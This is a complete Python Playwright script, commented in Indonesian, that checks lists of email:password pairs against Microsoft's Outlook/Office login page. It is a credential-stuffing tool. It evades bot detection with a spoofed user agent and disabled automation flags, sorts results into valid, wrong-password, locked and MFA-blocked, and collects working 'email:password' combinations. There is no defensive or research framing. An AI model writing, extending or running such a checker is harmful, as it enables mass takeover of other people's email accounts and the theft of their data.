import asyncio
from datetime import datetime
from playwright.async_api import async_playwright


async def wait_for_password_or_error(page):
    """Tunggu sampai halaman password muncul atau error email muncul"""
    while True:
        try:
            pwd = page.locator('input[type="password"]:visible')
            if await pwd.count() > 0:
                return "password_ready"
            err = page.locator('#usernameError:visible, [data-testid="usernameError"]:visible')
            if await err.count() > 0:
                return "email_error"
            body_text = await page.locator("body").inner_text()
            if "doesn't exist" in body_text.lower() or "we couldn't find" in body_text.lower():
                return "email_error"
        except:
            pass
        await asyncio.sleep(0.5)


async def wait_for_login_result(page):
    """Tunggu sampai salah satu hasil login muncul"""
    for _ in range(40):
        try:
            current_url = page.url.lower()

            # SUCCESS: Redirect ke Outlook / Office
            if any(x in current_url for x in [
                "outlook.live.com", "outlook.office.com", "outlook.office365.com",
                "office.com/owa", "mail.", "login.srf"
            ]):
                return "success"

            # SUCCESS: Stay signed in / KMSI
            if "kmsi" in current_url:
                return "success"

            body_text = ""
            try:
                body_text = await page.locator("body").inner_text()
                body_lower = body_text.lower()
            except:
                await asyncio.sleep(0.5)
                continue

            # SUCCESS: Stay signed in?
            if "stay signed in" in body_lower or "keep me signed in" in body_lower:
                return "success"

            # WRONG PASSWORD
            if any(x in body_lower for x in [
                "your account or password is incorrect",
                "password is incorrect",
                "that password is incorrect",
                "the password is incorrect"
            ]):
                return "wrong_password"

            # ACCOUNT LOCKED
            if any(x in body_lower for x in [
                "account is locked",
                "account has been locked",
                "been locked",
                "temporarily locked",
                "temporarily locked to prevent unauthorised use",
                "too many attempts"
            ]):
                return "locked"

            # MFA / APPROVE SIGN IN
            if any(x in body_lower for x in [
                "approve sign in request",
                "approve sign-in request",
                "verify your identity",
                "enter the number shown",
                "open your authenticator",
                "more information required",
                "confirm your identity",
                "enter code",
                "enter the code displayed in the authenticator",
            ]):
                return "mfa"

            # ACCESS DENIED
            if any(x in body_lower for x in [
                "you cannot access this right now",
                "cannot access this",
                "does not meet the criteria",
                "sign in was successful but"
            ]):
                return "access_denied"

            # Masih di halaman password
            pwd_input = page.locator('input[type="password"]:visible')
            if await pwd_input.count() > 0:
                err_div = page.locator('#passwordError:visible, [data-testid="passwordError"]:visible')
                if await err_div.count() > 0:
                    err_text = await err_div.inner_text()
                    if "incorrect" in err_text.lower():
                        return "wrong_password"
                    elif "locked" in err_text.lower():
                        return "locked"
                await asyncio.sleep(0.5)
                continue

        except Exception:
            pass

        await asyncio.sleep(0.5)

    return "unknown"


async def check_single_account(page, email, password):
    """Check satu akun, return (status, detail_message)"""
    try:
        # 1) Navigasi ke halaman login Microsoft
        await page.goto(
            "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
            "?client_id=9199b020-a13f-4107-85dc-07114787e498"
            "&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access"
            "&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fowa%2F"
            "&response_type=code"
            "&prompt=login",
            wait_until="domcontentloaded",
            timeout=30000
        )

        # 2) Input email
        email_input = page.locator('input[type="email"], input[name="loginfmt"]')
        await email_input.wait_for(state="visible", timeout=15000)
        await email_input.fill(email)
        await asyncio.sleep(0.5)

        next_btn = page.locator('input[type="submit"], button[type="submit"]')
        await next_btn.click()

        # 3) Tunggu password atau error
        try:
            result = await asyncio.wait_for(
                wait_for_password_or_error(page),
                timeout=15
            )
        except asyncio.TimeoutError:
            result = "timeout"

        if result == "email_error":
            return "failed", "Akun tidak ditemukan"
        elif result == "timeout":
            return "failed", "Timeout di halaman email"

        # 4) Input password
        password_input = page.locator('input[type="password"]:visible')
        await password_input.fill(password)
        await asyncio.sleep(0.3)

        submit_btn = page.locator('input[type="submit"]:visible, button[type="submit"]:visible')
        await submit_btn.click()

        # 5) Tunggu hasil
        try:
            result_status = await asyncio.wait_for(
                wait_for_login_result(page),
                timeout=20
            )
        except asyncio.TimeoutError:
            result_status = "unknown"

        # 6) Proses hasil
        if result_status == "success":
            return "success", "Login berhasil"
        elif result_status == "wrong_password":
            return "failed", "Password salah"
        elif result_status == "locked":
            return "failed", "Akun terkunci"
        elif result_status == "mfa":
            return "failed", "MFA - Approve sign in request"
        elif result_status == "access_denied":
            return "failed", "You cannot access this right now"
        else:
            current_url = page.url
            if any(x in current_url.lower() for x in ["outlook.live", "outlook.office", "office.com/owa", "mail."]):
                return "success", "Login berhasil (redirected)"
            return "success", "Status unknown, masuk success"

    except Exception as e:
        err_msg = str(e).split('\n')[0][:80]
        return "failed", f"Error: {err_msg}"


async def check_accounts(accounts, progress_callback=None):
    """
    Check list of (email, password) tuples.
    progress_callback: async function(index, total, email, status, detail)
    Returns (success_list, failed_list)
    """
    success_list = []
    failed_list = []
    total = len(accounts)

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-blink-features=AutomationControlled",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--single-process",
            ]
        )

        for i, (email, password) in enumerate(accounts, 1):
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                viewport={"width": 1280, "height": 720},
                locale="en-US",
            )
            page = await context.new_page()

            status, detail = await check_single_account(page, email, password)

            if status == "success":
                success_list.append(f"{email}:{password}")
            else:
                failed_list.append(f"{email}:{password} | {detail}")

            if progress_callback:
                await progress_callback(i, total, email, status, detail)

            await context.close()

            if i < total:
                await asyncio.sleep(1)

        await browser.close()

    return success_list, failed_list
